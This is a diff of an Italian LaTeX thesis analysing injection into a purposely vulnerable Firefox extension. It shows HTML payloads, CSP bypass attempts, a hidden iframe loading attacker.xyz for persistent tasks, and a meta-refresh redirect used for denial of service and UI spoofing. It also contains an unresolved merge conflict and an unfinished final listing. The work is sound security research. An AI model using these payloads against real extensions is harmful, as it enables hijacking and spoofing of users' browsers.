@@ -38,8 +38,10 @@
 \newcommand{\attr}[1]{\code{.#1}}
 \newcommand{\refSection}[1]{Sezione~\ref{#1}}
 \newcommand{\refChapter}[1]{Capitolo~\ref{#1}}
+\newcommand{\refCode}[1]{Listato~\ref{#1}}
 \newcommand{\Sezione}[1]{Sezione~\ref{#1}}
 \newcommand{\Capitolo}[1]{Capitolo~\ref{#1}}
+\newcommand{\Listato}[1]{\refCode{#1}}
 
 
     % Utility
@@ -57,6 +59,11 @@
 \newcommand{\ExtensionProcessScript}{\code{ExtensionProcessScript} }
 \newcommand{\WebExtensionPolicy}{\code{WebExtensionPolicy} }
 \newcommand{\ContentSecurityPolicy}{\code{ContentSecurityPolicy} }
+    % Html
+\newcommand{\tagHTML}[1]{\code{<#1>}}
+\newcommand{\meta}{\tagHTML{meta}}
+\newcommand{\script}{\tagHTML{script}}
+\newcommand{\iframe}{\tagHTML{iframe}}
 
 
 \definecolor{codegreen}{rgb}{0,0.6,0}
@@ -132,8 +139,13 @@
     nella \Sezione{I-linguaggi-fondamentali-del-www} si introducono i tre linguaggi fondamentali del web, HTML5,
     CSS e Javascript al quale dedico la sezione \Sezione{javascript}. CSS verrà soltanto menzionato poiché non ha
     avuto rilievo nella mia ricerca. Seguono due sezioni di presentazione alle estensioni browser, \Sezione{breve_storia_delle_estensioni}
+<<<<<<< HEAD
     \todo{e degli attacchi alle estensioni}  è un rapido riassunto sulla storia delle estensioni 
     mentre \Sezione{anatomia_di_una_web_extension} spiega la struttura di una WebExtension.
+=======
+    \todo{e degli attacchi alle estensioni} browser  è un rapido riassunto sulla storia delle estensioni 
+    mentre \Sezione{sec:anatomia_di_una_web_extension} spiega la struttura di una WebExtension.
+>>>>>>> 2b7dcaa (Attaccando vuln, segue)
 
 
     \section{I linguaggi fondamentali del \www}
@@ -274,7 +286,7 @@
         cross-browser è diventato possibile.
 
     \section{Anatomia di una Web Extension }
-    \label{anatomia_di_una_web_extension}
+    \label{sec:anatomia_di_una_web_extension}
         Una estensione è un insieme di script, fogli di stile e documenti html raccolti in una cartella o
         archivio compresso ottenibile dallo store del browser o dai file locali. L'installazione di una
         estensione può essere:
@@ -455,6 +467,7 @@
     applicativo e a livello fisico di sistema operativo.
 
     \section{Modello processi}
+    \label{sec:modello-processi}
         Il codice che compone Firefox e Gecko non è eseguito sotto un unico processo, diversi servizi
         sono eseguiti in diversi processi per garantire solidità nel caso di fallimenti o 
         compromissioni esterne; si dividono in tre categorie:
@@ -846,7 +859,6 @@
         queste finestre avranno accesso all'api \code{"storage"} come indicato nell'ultima voce \code{"permissions"};
         pertanto è lecito supporre che almeno una di esse ospiti codice \JS e memorizzi dati nello storage.
         
-
     \section{La sidebar}
     \label{sec:analisi-vuln-sidebar}
         Come detto nella \refSection{sec:estensione-vuln}, per costruzione sappiamo gia che la vulnerabilità
@@ -991,6 +1003,318 @@ window.onload = () => {
 \chapter{Attaccando \vuln}
 \label{cap:attaccando-vuln}
     si insomma dopo tutta sta trafila giungiamo ai fatti.
+
+    \section{Il sito dell'attaccante}
+    \label{sec:attaccando-vuln-sito}
+        Come visto nella \refSection{sec:analisi-vuln-content-script} il punto d'ingresso all'inezione
+        deve essere una pagina web (ospitata dall'URL controllato dall'attaccante o su un host locale)
+        che contenga due elementi html identificati dall'attributo \code{id} con valore \code{key} o
+        \code{value}, oppure che lanci l'evento \code{"trigger"}.\\
+        Il listato \ref{code:attack-page-base} mostra il codice che da ora in poi verrà usato come base per tutti gli attacchi
+        che seguiranno:
+        \begin{lstlisting}[caption={codice html della pagina di attacco}, captionpos=b, label={code:attack-page-base}]
+    <!DOCTYPE html>
+    <html>
+        <head>
+        </head>
+        <body>
+        <span id="key">chiave</span>
+        <span id="value">valore</span>
+        
+        <input id="btnTrigger" type="button" value="TRIGGER">
+    
+        <script defer>
+            btnTrigger.onclick = () => {
+                window.dispatchEvent( new CustomEvent("trigger", {
+                    detail:{
+                        key: "ev_chiave", 
+                        value: "ev_valore" 
+                    }
+                } ))
+            }
+        </script>
+        </body>
+    </html>
+        \end{lstlisting}
+        Righe 6-7 sono gli elementi cercati dal content script, il testo contenuto nei tag \code{<span>}
+        costituisce i valori, mentre l'elemento a riga 9 è un bottone programmato dallo script a riga 11
+        e quando viene premuto lancia l'evento \code{"trigger"}. L'utilizzo di un bottone per il
+        controllo dell'evento è puramente a scopo dimostrativo e non ne influenza la cattura da parte
+        del content-script.
+        La figura \ref{fig:sidebar-key-value-example} mostra un esempio di funzionamento dell'estensione,
+        il riquadro sulla destra mostra la pagina dell'attaccante mentr il riquadro sulla sinistra visualizza 
+        la finestra della sidebar nella quale si distinguono
+        i dati ottenuti dalla pagina dell'attaccante dove \textit{chiave:valore} proviene dagli
+        elementi \code{<span>} e \textit{ev\_chiave:ev\_valore} dal contenuto dell'evento.
+
+        \begin{figure}[ht]
+            \centering                                                  
+            \includegraphics[width=0.7\textwidth]{sidebar-key-value-example.png}
+            \caption{ Esempio di cattura e visualizzazione dei dati da parte dell'estensione }
+            \label{fig:sidebar-key-value-example}                             
+        \end{figure}
+
+    \section{Primi tentativi}
+    \label{sec:attaccando-vuln-tentativi}
+        Munito della pagina di exploit, ho dovuto prima di tutto confermare le assunzioni sul
+        codice vulnerabile e testare le restrizioni note; come payload iniziale ho scelto
+        di iniettare uno ad uno questi tag nel campo \code{value} dell'evento:
+        \begin{lstlisting}
+    <script src="sbMain.js" type="text/javascript">
+    <object data="javascript:location.href='about:blank'">
+    <img src="https://wallpapercave.com/wp/wp5357862.jpg" onload="location.href='about:blank'" >
+        \end{lstlisting},
+        tutti hanno cercato di eseguire codice javascript e tutti hanno fallito, cerchiamo di capire
+        le motivazioni dietro questo risultato.
+
+        \subsubsection{Primo payload}
+            \begin{lstlisting}
+                <script src="sbMain.js" type="text/javascript">
+            \end{lstlisting}
+            Il primo è un semplice tag script che esegue codice ottenuto dal file locale \file{sbMain.js},
+            gli obbiettivi di questo paylod sono due: scoprire se lo script venga incluso e scoprire che 
+            cosa sia considerato "locale" nel contesto della sidebar. Il risultato atteso era un errore
+            di Content Security Policy che bloccasse l'esecuzione dello script a fronte dell'inclusione del
+            tag nello schema html; il tag è stato inserito ma nessun errore è apparso sulla console e non
+            c'è stata alcuna esecuzione del codice \JS.\\
+            La ragione sta proprio nell'utilizzo del setter \attr{innerHTML}, come specificato nella
+            documentazione i tag \code{<script>} inseriti con questo metodo non saranno eseguiti per
+            ragioni di sicurezza \cite{innerHTML}; torneremo su questo punto nella \refSection{sec:attaccando-vuln-iframe-inclusion}.
+
+        \subsubsection{Secondo payload}
+            \begin{lstlisting}
+    <object data="javascript:location.href='about:blank'">
+            \end{lstlisting}
+            Questo payload è un classico bypass della restrizione di sicurezza su \attr{innerHTML} che ha impedito al
+            payload precedente di essere eseguito, si tratta di un tag \code{<object>} che contiene una risorsa
+            ottenuta dall'URL specificato nel campo \code{data}. Come il lettore avrà notato l'URL del payload
+            è diverso dagli altri, infatti è un booklet, un tipo di URI caratterizzato dal protocollo \code{javascript:}
+            che esegue codice \JS quando interpretato; in questo caso il codice in questione redirige
+            la finestra corrente sulla pagina \code{about:blank}, o almeno è cio che accadrebbe in una pagina web
+            con una Content Security Policy blanda ma nel caso della sidebar il risultato atteso è il lancio
+            di un errore di sicurezza che blocca l'esecuzione dello script. Sotto questa ottica si potrebbe dire che
+            il test ha avuto successo, dal punto di vista dell'attaccante un po' meno.\\
+            La sidebar include correttamente il tag nella sua finestra ma la CSP dell'estensione identifica un tentativo
+            d'esecuzione di script-inline e lo blocca. Ne deduco che anche inserendo booklet nelle proprietà di
+            altri tag la CSP verrà comunque allertata.
+
+        \subsubsection{Terzo payload}
+            \begin{lstlisting}
+    <img src="https://wallpapercave.com/wp/wp5357862.jpg" onload="location.href='about:blank'" >
+            \end{lstlisting}
+            L'ultimo payload tenta di ottenere una risorsa immagine da un URL terzo e redirigere la pagina
+            quando l'elemento è stato caricato. L'attributo \code{onload} specifica il codice javascript
+            da eseguire, gia discusso nella sezione precedente. Poiché la CSP delle estensioni restringe 
+            solo l'origine degli script mi aspetto che l'immagine venga visualizzata nella sidebar ma il
+            codice non sia eseguito. L'iniezione del tag conferma entrambe le ipotesi dimostrando che
+            è effettuare richieste a qualsiasi url, mentre il contenuto di \code{onload} viene segnalato
+            come script-inline e bloccato.\\
+
+    \section{Bypass delle restrizoni}
+    \label{sec:attaccando-vuln-bypass}
+        I test precedenti hanno evidenziato le due maggiori difficoltà dietro l'iniezione di script,
+        \attr{innerHTML} impedisce l'uso di tag \script approcci volti all'inclusione si script locali
+        e la CSP della pagina nullifica le tecniche comuni di bypass di questo problema. Nelle sezioni
+        che seguono discuto dei tentativi di mitigazione delle restrizioni e di quali impedimenti ho
+        incontrato lungo il percorso.
+        
+        \subsection{Override via tag \meta}
+        \label{sec:attaccando-vuln-bypass-meta}
+            In HTML5 è presente un tag dalle proprietà peculiari, si tratta del tag \meta.
+            Nella documentazione mozilla viene introdotto come \textit{"un elemento che rappresenta 
+            metadati non esprimibili attraverso altri tag relativi a metadati, come \code{<base>}, 
+            \code{<link>}, \script, \code{<style>} o \code{<title>}"} \cite{tag-meta}.
+            Questo tag permette di specificare una coppia chiave-valore, a seconda dei dati di
+            questa coppia l'effetto sulla pagina può variare da semplici informazioni aggiuntive
+            a modifiche ai metadati di sicurezza o della pagina stessa. Per il miei scopi ho fatto
+            uso dell'attributo \code{http-equiv}.\\
+            Sempre la documentazione mozilla afferma: \textit{"Se l'attributo \code{http-equiv} è impostato,
+            l'elemento \meta è una direttiva pragma fornente informazioni equivalenti a quelle che
+            verrebbero date da un header HTTP dotato di un nome simile "} \cite{tag-meta}. La Content
+            Security Policy di una risorsa web viene solitamente specificata da un header HTTP della
+            risposta oppure dal tag \meta impostando \code{"content-security-policy"} come valore
+            dell'attributo \code{http-equiv} e la politica desiderata come valore dell'attributo \code{content},
+            così:
+            \begin{lstlisting}[label=code:meta-tag-example]
+<meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
+            \end{lstlisting}
+            Il codice \ref{code:meta-tag-example} indica al browser che la Content Security Policy della
+            pagina autorizza l'esecuzione di script-inline come quelli bloccati nei miei primi tentativi.\\
+            A fronte di queste informazioni ho costruito un nuovo payload che sovrascrivesse la CSP della
+            pagina ed eseguisse \JS inline, il listato sottostante mostra tale codice:
+            \begin{lstlisting}
+    <meta http-equiv="Content-Security-Policy" content="script-src unsafe-inline" />
+    <object data="javascript:location.href='about:blank'">
+            \end{lstlisting}
+            Purtroppo neanche questo test ha avuto successo, la console mi ha restituito un errore di Content
+            Security Policy affermando che lo script-inline violasse la CSP della pagina. La causa
+            di questo fallimento è dovuta ad un'altra misura di sicurezza specifica delle WebExtension: la CSP
+            di default può essere modificata soltanto dalla voce \code{"content\_security\_policy"} del 
+            \manifest (vedi \refSection{sec:difese-background-sidebar}).\\
+            \todo{NO, oltre a questo ci sono due requisiti: 1-deve esserci 'self', 2-non può esserci 'unsafe-inline'}
+        
+        
+        \subsection{Inclusione di \iframe}
+        \label{sec:attaccando-vuln-bypass-iframe}
+            Un tag \iframe rappresenta un \todo{Aggiungere Browsing e Window context al capitolo sicurezza}Browsing Context
+            innestato nella pagina che lo ospita, il suo contenuto dipende dall'attributo \code{src} che specifica
+            l'URI sorgente della sotto-finestra. Trattandosi di un Browsing Context indipendente si deduce che
+            il compartimento dell'\iframe sia separato da quello del genitore e innestando una pagina controllata
+            dall'attaccante gli script interni all'iframe otterranno un wrapper cross-origin o addirittura opaco
+            della finestra esterna (vedi \refSection{sec:sicurezza-script-security-policy}).\\
+            Esiste però un altro attributo chiamato \code{srcdoc} il cui valore è interpretato come codice html della
+            pagina innestata; abilitando l'inclusione di script esterni a fine dimostrativo, possiamo notare che
+            il compartimento di un iframe sì costruito è considerato same-origin con il suo contenitore.
+            Il listato \ref{code:sidebar-iframe-example} è un payload costruito per dimostrare le proprietà di un
+            \iframe che definisce il proprio codice di pagina mentre la figura \ref{fig:sidebar-iframe-example}
+            mostra il risultato dell'iniezione. Il piccolo riquadro bordato di nero all'interno della sidebar è
+            l'iframe iniettato, le stringhe \code{Self=} e \code{Parent=} sono state inserite nella pagina dal
+            codice di \file{http://localhost/code.js} e mostrano l'origine dell'iframe stesso e della pagina
+            contenitore rispettivamente. Riporto il testo di \code{Parent=} troncato dall'immagine:\\
+            \code{Parent=moz-extension://ee77424a-5839-4f17-a837-6c1d6d12eed9/sidebar/page.html}\\
+
+            \begin{lstlisting}[caption={iframe costruito con srcdoc},label={code:sidebar-iframe-example}]
+<iframe srcdoc="<html><body><script src=http://localhost/code.js ><\/script></body></html>">
+            \end{lstlisting}
+
+            \begin{figure}[ht]
+                \centering
+                \includegraphics[width=0.8\textwidth]{sidebar-iframe-test.png}
+                \caption{Un iframe iniettato nella sidebar che mostra l'origine associata a se e alla finestra genitore}
+                \label{fig:sidebar-iframe-example}
+            \end{figure}
+
+            Da questo test si estrapolano tre punti importanti:
+            \begin{enumerate}
+                \item Seppure dal punto di vista dell'\iframe la propria origine sia \code{about:srcdoc}, è comunque
+                        considerato same-origin dal genitore ed ha accesso al WebExtensionAPI
+
+                \item L'URI di una estensione è un uuid prefisso dal protocollo \code{moz-extension://}, potenzialmente
+                        navigabile.
+
+                \item Il lettore attento avrà notato che (al dilà della Content Security Policy) è stato possibile
+                        includere ed eseguire codice \JS nell'iframe, e quindi nella pagina della sidebar, nonostante 
+                        il setter \attr{innerHTML}.
+            \end{enumerate}
+            
+    
+    \section{Sfruttare la vulnerabilità}
+    \label{sec:attaccando-vuln-risultati}
+        Seppure non sia riuscito ad eseguire codice arbitrario, l'attaccante può comunque disturbare il corretto
+        funzionamento dell'estensione combinandone sapientemente le caratteristiche con i risultati
+        ottenuti in precedenza. Come verrà discusso nelle sezioni seguenti, il livello di danno provocato da queste 
+        tecniche dipende molto dalle funzionalità e dai file accessibili all'estensione. Sotto questa luce 
+        quello di \vuln è un ambiente piuttosto magro che non rende onore ai risultati ottenibili con estensioni più 
+        complesse eppure sufficiente ai fini dimostrativi dell'articolo.
+
+        \subsection{Script persistente}
+            L'attaccante potrebbe non essere interessato agli api accessibili dal codice iniettato ma
+            alla frequenza con cui viene eseguito o alla sua persistenza sulla macchina della vittima, 
+            in questi termini si pensi ai crypto-miner o agli ad-ware, programmi che necessitano di 
+            rimanere in esecuzione quanto piu a lungo possibile.
+            Non è raro trovare link ingannevoli che conducono ( piu o meno
+            volontariamente) la vittima su una pagina web ospitante \JS malevolo, ma tutti questi malware
+            si imbattono nel problema della volatilità della pagina ospite che potrebbe venir chiusa in
+            qualsiasi momento. Negli anni sono state sviluppate tecniche per celare la finestra agli occhi
+            dell'utente cercando di mantenerla attiva il più a lungo possibile (si pensi ai pop-under), ma
+            una estensione vulnerabile che visualizzi di frequente dati immagazzinati in uno storage 
+            persistente fornirebbe agli sviluppatori di malware un modo piu silenzioso e robusto di
+            archiviare link ai propri script.\\
+            Il \refCode{code:iframe-nascosto} mostra il codice html per iniettare un \iframe invisibile
+            all'utente contenente una pagina che immaginiamo svolga un qualche task malevolo a lungo termine.
+
+            \begin{lstlisting}[label=code:iframe-nascosto]
+    <iframe src=http://www.attacker.xyz/task.html style="position: absolute; width:0; height:0; border:0;" >
+            \end{lstlisting}
+
+            Dopo essere stato inviato allo script in background, il payload viene salvato nella storage ed
+            iniettato in modo automatico nella finestra della sidebar ad ogni apertura. Nell'ipotesi che
+            la sidebar venga aperta almeno una volta per ogni sessione di utilizzo del browser, l'attaccante
+            avrà la quasi certezza che il task malevolo verrà eseguito con frequenza.
+
+        \subsection{Redirect della pagina}
+            Seppure il tag \meta possa sovrascrivere la CSP della pagina, nella \refSection{sec:attaccando-vuln-bypass-meta}
+            sono state discusse le ragioni per cui non sia possibile nel contesto delle estensioni, ma
+            nonostante cio il tag \meta mi ha permesso di ottenere un attacco di Denial Of Service sulla finestra 
+            della sidebar. Oltre alla chiave \code{"content-security-policy"}
+            l'attributo \code{http-equiv} accetta un'altro pseudo-header HTTP, \code{"refresh"}. La chiave
+            \code{"refresh"} impone alla pagina di essere ricaricata o reindirizzata su un'altro dominio dopo
+            un periodo di timeout arbitrario, la sintassi appare così:
+            \begin{lstlisting}[label=code:sidebar-meta-refresh-example]
+                <meta http-equiv="refresh" content="1; http://www.attacker.xyz/" >
+            \end{lstlisting}
+            La riga precedente si traduce come: "attendi 1 secondo, poi reindirizza la pagina sull'URL 
+            \code{'http://www.attacker.xyz/'}".
+            Usando questa direttiva è possibile reindirizzare qualsiasi finestra verso un URL arbitrario,
+            nel caso di \vuln significa che la pagina della sidebar può essere resa inutilizzabile fino a
+            quando il payload non avrà lasciato l'archivio dell'estensione. La figura \ref{fig:sidebar-meta-refresh-1}
+            mostra gli effetti del \refCode{code:sidebar-meta-refresh-example} iniettato nella sidebar.
+
+            \begin{figure}
+                \centering
+                \includegraphics[width=0.8\textwidth]{sidebar-meta-refresh-1.png}
+                \caption{Dirottamento della finestra sidebar verso il sito dell'attaccante}
+                \label{fig:sidebar-meta-refresh-1}
+            \end{figure}
+
+            Per quanto possa sembrare innocuo, sotto le giuste condizioni questo payload è capace di
+            nascondere delle insidie. Seguono alcuni possibili utilizzi in diversi scenari:
+            
+            \subsubsection{DOS della pagina di background}
+                Supponiamo che il punto di iniezione non si trovi nella UI dell'estensione ma nel
+                codice degli script di background. Anch'essi sono dotati di un oggetto \code{window}
+                associato ad una finestra non visibile all'utente ma comunque presente ed oggetto 
+                globale della pagina. Si prenda come esempio il \Listato{code:background-page} che
+                mostra il contenuto del \file{background/bgPage.html} di \vuln{}, la pagina descritta
+                da tale codice carica gli script di background ma non viene mai visualizzata.
+
+                \begin{lstlisting}[label=code:background-page]
+    <!DOCTYPE html>
+    <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script src="../shared/archive.js"></script>
+            <script type="module" src="bgMain.js"></script>
+            <title>Background script window page</title>
+        </head>
+        <body>
+            
+        </body>
+    </html>
+                \end{lstlisting}
+
+                Sotto queste condizioni, una iniezione riuscita porta al reindirizzamento della pagina
+                di background e l'interruzione dei suoi script, negando qualsiasi tipo di servizio a
+                sidebar e content-script dell'estensione. 
+
+            \subsubsection{Spoofing della UI}
+                Non tutte le estensioni sono innocue come \vuln{}, alcune estensioni trattano dati
+                sensibili come crypto-wallet, password manager e sicurezza del browser e spesso
+                richiedono almeno un passo di configurazione attraverso la pagina delle opzioni 
+                (vedi \refSection{sec:anatomia_di_una_web_extension} ). Codice vulnerabile come 
+                quello di \vuln{}, collocato su interfacce grafiche di importanza critica potrebbe
+                non essere sufficiente per eseguire \JS privilegiato o rubare i dati dallo storage,
+                ma grazie al tag \meta sarebbe possibile rimpiazzare del tutto la finestra con
+                una identica ma controllata dall'attaccante.
+
+        \subsection{Esecuzione di script da origini fidate}
+            Usando l'attributo \code{srcdoc} è stato possibile usare gli \iframe per eseguire un tag \script nella
+            pagina dell'estensione, ma non è stato possibile caricare codice arbitrario a causa delle 
+            restrizioni di CSP che impediscono l'ottenimento di una risorsa \JS da origini remote o inline
+            ma non da origini locali. Sotto le giuste condizioni le fonti locali potrebbero essere
+            sufficienti per compromettere il sistema della vittima. Per dimostrare quanto detto però
+            è necessario fare una piccola modifica ai codici di \vuln{}.\\
+            Introduco il file \file{sidebar/win.js} nel percorso della sidebar, il \refCode{code:win-js-example-1}
+            ne mostra il contenuto.
+            \begin{lstlisting}[label=code:win-js-example-1]
+                parent.document.body.innerHTML = "YOU WON"
+            \end{lstlisting}
+            Si tratta di un semplice defacciamento della pagina genitore, ai fini dell'esperimento si immagini
+            che \file{sidebar/win.js} contenga 
+            \begin{lstlisting}[label=code:iframe-win-js-example-1]
+                //
+            \end{lstlisting}
 
 
 \chapter{Conclusioni}
